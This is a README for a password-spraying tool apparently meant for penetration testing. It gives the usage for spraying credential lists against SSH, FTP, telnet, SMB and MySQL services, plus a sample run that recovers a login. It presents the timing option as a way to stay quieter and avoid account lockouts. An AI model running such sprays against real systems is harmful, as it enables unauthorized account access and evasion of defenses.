#***PASSWORD SPRAY MULTI USE (PSMU) AKA SPRAYETTE***
# Introduction
	The idea of sprayette was to have a tool that it can be used to perform a password spray over multiple 
	services like ssh,ftp,telnet,smb,mysql so far. 
	Also adds the possiblity of use a timer for the process so it can "less noisy" and in some cases avoid
	an account lockout since its a brute force attack.


# Requisites
	argparse
	time
	telnetlib
	paramiko (SSH)
	mysql.connector
	ftplib

# Usage
	root@kali# ./sprayette.py -h
	usage: sprayette.py [-h] [-p PORT] protocol ip users passwords attemps timer

	positional arguments:
		protocol              Protocol to perform the spray (telnet,ssh,ftp,smb,mysql)
		ip                    The ip to perform the spray
		users                 Users list (one per line)
		passwords             Passwords list (one per line)
		attemps               The amount of attemps before the timer starts
		timer                 The sleep time (minutes)

		optional arguments:
		 -h, --help            show this help message and exit
		 -p PORT, --port PORT

# Example
	root@kali# ./sprayette.py ssh 192.168.0.146 user.txt passwords.txt 2 1
	[*] Trying with misc:qwerty -> Failed!!!
	[*] Trying with neo:qwerty -> Failed!!!
	[*] Trying with root:qwerty -> Failed!!!
	[*] Trying with misc:toor -> Success!!!
	[*] Trying with neo:toor -> Failed!!!
	[*] Trying with root:toor -> Failed!!!
	Going to sleep for 1 minutes
	Back on spray
	[*] Trying with neo:password -> Failed!!!
	[*] Trying with root:password -> Failed!!!
	Obtained the following credentials:
	misc:toor

